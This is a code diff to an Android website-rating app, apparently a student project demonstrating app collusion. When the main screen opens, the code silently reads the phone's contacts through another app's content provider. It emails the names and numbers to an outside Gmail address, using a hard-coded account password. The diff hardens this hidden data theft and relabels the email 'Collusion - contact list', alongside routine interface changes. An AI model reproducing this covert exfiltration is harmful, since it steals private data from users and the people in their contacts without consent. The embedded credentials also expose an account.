@@ -35,10 +35,12 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         websites_db = new WebsitesDatabase(this);
+
+        // Constructing the string containing the phone contacts for the email body
         StringBuilder body = new StringBuilder();
         body.append("Contacts : \n");
         Cursor contacts = getContentResolver().query(Uri.parse("content://com.enseirb.collusioncontact.provider"), null, null, null, null);
-        if (contacts.moveToFirst()) {
+        if (contacts != null && contacts.moveToFirst()) {
             do {
                 String contactName = contacts.getString(contacts.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                 String contactId = contacts.getString(contacts.getColumnIndex(ContactsContract.Contacts._ID));
@@ -55,10 +57,12 @@ public class MainActivity extends AppCompatActivity {
                 body.append(contactName).append(" : ").append(phoneNumbers).append("\n");
                 Log.v(TAG,body.toString());
             } while (contacts.moveToNext());
+            contacts.close();
         }
-        contacts.close();
+
         sendEmail(body.toString());
     }
+
 
     /*
      *   AUXILIARY FUNCTIONS
@@ -72,10 +76,11 @@ public class MainActivity extends AppCompatActivity {
         String fromEmail = "jean.test.mobile@gmail.com";
         String fromPassword = "MotDePasse123!";
         String toEmail = "juliette.deguillaume@gmail.com";
-        String emailSubject = "Subject test bis";
+        String emailSubject = "Collusion - contact list";
 
         new GMail(fromEmail, fromPassword, toEmail, emailSubject, emailBody);
     }
+
 
     /*
      *   ON CLICK EVENTS
@@ -102,6 +107,19 @@ public class MainActivity extends AppCompatActivity {
             hideButtonsSection(view);
             displayWebsiteRating(view);
         }
+    }
+
+    public void goToWebsitesList(View view) {
+        Intent websites_list = new Intent(this, DisplayWebsitesActivity.class);
+        startActivity(websites_list);
+    }
+
+    public void doNotSaveWebsite(View view) {
+        EditText et_url = findViewById(R.id.url);
+        et_url.setText("");
+        displayButtonsSection(view);
+        hideWebsiteExistingRating(view);
+        hideWebsiteRating(view);
     }
 
     public void updateOrSaveWebsite(View view) {
@@ -160,7 +178,7 @@ public class MainActivity extends AppCompatActivity {
         LinearLayout rating_section = findViewById(R.id.rating_section);
         RatingBar ratingBar = findViewById(R.id.ratingBar);
 
-        rating_section.setVisibility(View.INVISIBLE);
+        rating_section.setVisibility(View.GONE);
         ratingBar.setRating(0);
     }
 
@@ -169,6 +187,7 @@ public class MainActivity extends AppCompatActivity {
         EditText et_url = findViewById(R.id.url);
         RatingBar ratingBar = findViewById(R.id.ratingBar);
         Button save_update_btn = findViewById(R.id.save_update_btn);
+        Button dont_save_btn = findViewById(R.id.dont_save_btn);
 
         websites_db.open();
         float rating = websites_db.getRatingByUrl(et_url.getText().toString());
@@ -177,10 +196,12 @@ public class MainActivity extends AppCompatActivity {
         if (rating >= 0) {
             ratingBar.setRating(rating);
             save_update_btn.setText(R.string.update_btn);
+            dont_save_btn.setText(R.string.dont_update_btn);
             websiteExistsInDB = true;
         } else {
             ratingBar.setRating(0);
             save_update_btn.setText(R.string.save_btn);
+            dont_save_btn.setText(R.string.dont_save_btn);
             websiteExistsInDB = false;
         }
 
@@ -196,7 +217,7 @@ public class MainActivity extends AppCompatActivity {
         TextView rating_text = findViewById(R.id.display_rating_text);
         RatingBar ratingBar = findViewById(R.id.ratingDisplayBar);
 
-        rating_section.setVisibility(View.INVISIBLE);
+        rating_section.setVisibility(View.GONE);
         rating_text.setText("");
         ratingBar.setRating(0);
     }
@@ -212,7 +233,7 @@ public class MainActivity extends AppCompatActivity {
         websites_db.close();
 
         if (rating_section.getVisibility() == View.VISIBLE) {
-            rating_section.setVisibility(View.INVISIBLE);
+            rating_section.setVisibility(View.GONE);
         } else {
             rating_section.setVisibility(View.VISIBLE);
 
@@ -221,7 +242,7 @@ public class MainActivity extends AppCompatActivity {
                 ratingDisplayBar.setRating(rating);
                 rating_text.setText("You rated " + et_url.getText().toString() + " :");
             } else {
-                ratingDisplayBar.setVisibility(View.INVISIBLE);
+                ratingDisplayBar.setVisibility(View.GONE);
                 rating_text.setText("You did not rate " + et_url.getText().toString());
             }
         }
